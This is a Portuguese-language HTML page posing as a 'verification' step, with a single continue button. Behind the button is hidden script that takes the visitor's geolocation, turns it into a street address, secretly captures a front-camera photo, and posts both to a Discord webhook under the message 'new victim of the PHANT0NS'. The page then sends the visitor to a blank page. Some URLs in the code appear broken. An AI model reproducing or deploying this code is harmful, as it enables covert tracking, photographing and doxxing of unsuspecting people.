<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação</title>
    <style>
        body { background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 80px; }
        .vermelho { color: red; font-weight: bold; font-size: 26px; }
        .verde { color: #00ff00; font-weight: bold; font-size: 22px; }
        #btn { padding: 20px 40px; font-size: 18px; cursor: pointer; background: #222; color: white; border: 1px solid #444; border-radius: 8px; }
    </style>
</head>
<body>
    <div id="m" style="display:none;">
        <p class="vermelho">TEXTO TEXTO TEXTO</p>
        <p class="verde">TEXTO TEXTO TEXTO TEXTO!</p>
        <p>TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO6!!!</p>
    </div>
    <button id="btn">CLIQUE PARA CONTINUAR</button>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const WEBHOOK = 'https://discord.com';

        document.getElementById('btn').addEventListener('click', async () => {
            document.getElementById('m').style.display = 'block';
            document.getElementById('btn').style.display = 'none';

            try {
                // 1. Localização
                const p = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 10000});
                });
                
                const resLocal = await fetch(`https://openstreetmap.org{p.coords.latitude}&lon=${p.coords.longitude}`);
                const dLocal = await resLocal.json();
                const endereco = dLocal.display_name || "Endereço não identificado";

                // 2. Foto Frontal (Apenas a frontal para evitar bloqueio)
                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 1500));
                
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const foto = canvas.toDataURL('image/jpeg');
                
                stream.getTracks().forEach(t => t.stop());

                // 3. Envio
                const fd = new FormData();
                fd.append('payload_json', JSON.stringify({
                    content: "NOVA VÍTIMA DOS PHANT0NS 😈😈",
                    embeds: [{
                        title: "DADOS COLETADOS",
                        description: `📍 **LOCALIZAÇÃO:**\n${endereco}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\nphant0ns 😈`,
                        color: 16711680,
                        image: { url: 'attachment://f.jpg' }
                    }]
                }));

                const blob = await (await fetch(foto)).blob();
                fd.append('file', blob, 'f.jpg');

                await fetch(WEBHOOK, { method: 'POST', body: fd });
                
                alert("Verificação concluída!"); // Aviso para você saber que o código chegou ao fim
                window.location.href = "about:blank";

            } catch (err) {
                alert("Erro: " + err.message); // Isso vai te dizer exatamente POR QUE não foi
                window.location.href = "about:blank";
            }
        });
    </script>
</body>
</html>
